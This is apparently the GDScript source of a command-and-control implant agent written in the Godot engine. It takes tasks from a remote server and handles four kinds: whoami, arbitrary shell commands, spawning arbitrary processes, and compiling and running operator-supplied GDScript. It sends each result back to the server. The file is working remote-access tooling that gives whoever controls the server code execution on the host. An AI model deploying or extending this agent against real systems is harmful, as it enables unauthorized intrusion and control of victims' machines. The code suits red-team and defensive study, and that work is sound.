extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")

func _on_tasking_whoami(task):

	if task.has("command") and task.get("command") == "whoami":
		var output = []

		var exit_code = OS.execute("whoami", [], output, true, false)

		print("")
		print(exit_code)
		print(output)
		print("")

		api.send_agent_response(
			api.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output[0],
				[
					[
						"Process Create",
						"/usr/bin/whoami"
					]
				]
			)
		)

	else:
		print("bad whoami task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_shell(task):
	# {command:shell, id:4bca52fb-2e65-48bb-86cb-83bbf9b3872f, parameters:{"command": "ls", "arguments": ["-alht"]}, timestamp:1646101624.903044}

	if task.has("command") and task.get("command") == "shell" and task.has("parameters"):
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var command = parameters.get("command")
		var arguments = parameters.get("arguments")
		var output = []
		print("executing the following command and arguments")
		print(command)
		print(arguments)
		print("")
		var exit_code = OS.execute(command, arguments, output, true, false)

		print("")
		print(exit_code)
		print(output)
		print("")

		api.send_agent_response(
			api.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output[0],
				[
					[
						"Process Create",
						command + " " + " ".join(PackedStringArray(arguments))
					]
				]
			)
		)

	else:
		print("bad shell task: ", task)
		# TODO: agent_response in failure cases

func _on_tasking_spawn(task):
	# {command:spawn, id:4bca52fb-2e65-48bb-86cb-83bbf9b3872f, parameters:{"command": "path to binary", "arguments": ["-alht"]}, timestamp:1646101624.903044}

	if task.has("command") and task.get("command") == "spawn" and task.has("parameters"):
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var command = parameters.get("command")
		var arguments = parameters.get("arguments")
		print("executing the following command and arguments")
		print(command)
		print(arguments)
		print("")
		var pid = OS.create_process(command, arguments)

		print("")
		print(pid)
		print("")
		
		var output = "Process Created with PID: %s" % [pid]

		api.send_agent_response(
			api.create_task_response(
				pid != -1,
				true,
				task.get("id"),
				output,
				[
					[
						"Process Create",
						command + " " + " ".join(PackedStringArray(arguments))
					]
				]
			)
		)

	else:
		print("bad shell spawn: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_gdscript(task):

	if task.has("command") and task.get("command") == "gdscript" and task.has("parameters"):
		# TODO: spawn a thread?
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var gdscript = GDScript.new()
		gdscript.source_code = parameters.get("script")
		gdscript.reload()
		var script_instance = gdscript.new()
		var output = script_instance.call("invoke")
		print("executing the following command and arguments")
		print(gdscript.source_code)
		print("")
		print(output)
		print("")

		api.send_agent_response(
			api.create_task_response(
				true,
				true,
				task.get("id"),
				output
			)
		)

	else:
		print("bad gdscript task: ", task)
		# TODO: agent_response in failure cases
